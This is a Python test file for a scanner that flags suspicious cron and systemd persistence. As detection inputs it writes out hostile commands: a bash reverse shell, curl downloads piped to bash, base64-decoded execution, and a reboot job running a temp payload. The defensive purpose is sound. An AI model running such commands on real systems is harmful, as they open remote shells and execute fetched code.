from pathlib import Path
from types import SimpleNamespace

from erislite.persistence import cron


def write_crontab(tmp_path: Path, content: str) -> Path:
    path = tmp_path / "crontab"
    path.write_text(content, encoding="utf-8")
    return path


def test_tag_command_detects_reverse_shell():
    tags = cron.tag_command(
        "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"
    )

    assert "reverse_shell" in tags


def test_tag_command_detects_external_payload():
    tags = cron.tag_command(
        "curl http://example.com/payload.sh -o /tmp/payload.sh"
    )

    assert "external_payload" in tags
    assert "temp_execution" in tags


def test_tag_command_detects_base64_decode():
    tags = cron.tag_command(
        "echo ZWNobyBoZWxsbw== | base64 -d | bash"
    )

    assert "encoded_execution" in tags


def test_tag_command_detects_hidden_execution():
    tags = cron.tag_command(
        "/home/alice/.hidden/payload"
    )

    assert "hidden_execution" in tags


def test_normal_command_is_not_flagged():
    tags = cron.tag_command(
        "/usr/bin/find /var/log -type f -mtime +7 -delete"
    )

    assert tags == []


def test_apt_config_eval_is_not_flagged_as_encoded_execution():
    tags = cron.tag_command(
        'eval $(apt-config shell StateDir Dir::State/d)'
    )

    assert "encoded_execution" not in tags


def test_parse_system_crontab_detects_suspicious_command(tmp_path):
    path = write_crontab(
        tmp_path,
        """
* * * * * root curl http://example.com/p.sh | bash
""",
    )

    findings = cron._parse_system_crontab(str(path))

    assert len(findings) == 1
    assert findings[0]["type"] == "Cron"
    assert findings[0]["owner"] == "root"
    assert "external_payload" in findings[0]["tags"]


def test_parse_system_crontab_ignores_comments(tmp_path):
    path = write_crontab(
        tmp_path,
        """
# * * * * * root curl http://evil.example/p.sh
""",
    )

    findings = cron._parse_system_crontab(str(path))

    assert findings == []


def test_parse_system_crontab_ignores_environment_lines(tmp_path):
    path = write_crontab(
        tmp_path,
        """
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
* * * * * root /usr/bin/true
""",
    )

    findings = cron._parse_system_crontab(str(path))

    assert findings == []


def test_parse_system_crontab_handles_at_reboot(tmp_path):
    path = write_crontab(
        tmp_path,
        """
@reboot root /tmp/payload.sh
""",
    )

    findings = cron._parse_system_crontab(str(path))

    assert len(findings) == 1
    assert findings[0]["owner"] == "root"
    assert findings[0]["command"] == "/tmp/payload.sh"
    assert "temp_execution" in findings[0]["tags"]


def test_parse_system_crontab_preserves_command_fields(tmp_path):
    path = write_crontab(
        tmp_path,
        """
0 3 * * * backup /usr/local/bin/backup --full
""",
    )

    findings = cron._parse_system_crontab(str(path))

    assert findings == []


def test_first_interesting_line_returns_suspicious_line():
    content = """
#!/bin/bash

echo normal
curl http://example.com/payload.sh
"""

    line = cron._first_interesting_line(content)

    assert line == "curl http://example.com/payload.sh"


def test_first_interesting_line_uses_fallback_when_needed():
    content = """
# comment
echo hello
"""

    line = cron._first_interesting_line(content)

    assert line == "Suspicious pattern detected in script"


def test_user_crontab_detects_suspicious_job(monkeypatch):
    monkeypatch.setattr(
        cron,
        "shutil_which",
        lambda command: "/usr/bin/crontab",
    )

    monkeypatch.setattr(
        cron.pwd,
        "getpwall",
        lambda: [
            SimpleNamespace(
                pw_name="alice",
                pw_uid=1000,
            )
        ],
    )

    result = SimpleNamespace(
        returncode=0,
        stdout="* * * * * curl http://example.com/p.sh | bash\n",
    )

    monkeypatch.setattr(
        cron.subprocess,
        "run",
        lambda *args, **kwargs: result,
    )

    findings = cron.check_user_crontabs()

    assert len(findings) == 1
    assert findings[0]["type"] == "User Cron"
    assert findings[0]["owner"] == "alice"
    assert "external_payload" in findings[0]["tags"]


def test_user_crontab_skips_system_users(monkeypatch):
    monkeypatch.setattr(
        cron,
        "shutil_which",
        lambda command: "/usr/bin/crontab",
    )

    monkeypatch.setattr(
        cron.pwd,
        "getpwall",
        lambda: [
            SimpleNamespace(
                pw_name="daemon",
                pw_uid=1,
            )
        ],
    )

    calls = []

    def fake_run(*args, **kwargs):
        calls.append(args)
        return SimpleNamespace(
            returncode=0,
            stdout="",
        )

    monkeypatch.setattr(
        cron.subprocess,
        "run",
        fake_run,
    )

    findings = cron.check_user_crontabs()

    assert findings == []
    assert calls == []


def test_run_scan_returns_warning_when_findings_exist(monkeypatch):
    monkeypatch.setattr(cron, "get_os", lambda: "Linux")
    monkeypatch.setattr(
        cron,
        "check_cron_jobs",
        lambda: [{"type": "Cron"}],
    )
    monkeypatch.setattr(
        cron,
        "check_user_crontabs",
        lambda: [],
    )
    monkeypatch.setattr(
        cron,
        "check_systemd_timers",
        lambda: [],
    )

    result = cron.run_cron_timer_scan(silent=True)

    assert result == {
        "status": "warning",
        "details": ["1 suspicious scheduled task(s) flagged"],
        "tags": ["suspicious_cron"],
    }


def test_run_scan_returns_ok_when_clean(monkeypatch):
    monkeypatch.setattr(cron, "get_os", lambda: "Linux")
    monkeypatch.setattr(
        cron,
        "check_cron_jobs",
        lambda: [],
    )
    monkeypatch.setattr(
        cron,
        "check_user_crontabs",
        lambda: [],
    )
    monkeypatch.setattr(
        cron,
        "check_systemd_timers",
        lambda: [],
    )

    result = cron.run_cron_timer_scan(silent=True)

    assert result == {
        "status": "ok",
        "details": [],
        "tags": [],
    }


def test_run_scan_returns_unsupported_on_other_platform(monkeypatch):
    monkeypatch.setattr(cron, "get_os", lambda: "Darwin")

    result = cron.run_cron_timer_scan(silent=True)

    assert result == {
        "status": "unsupported",
        "details": [],
        "tags": [],
    }
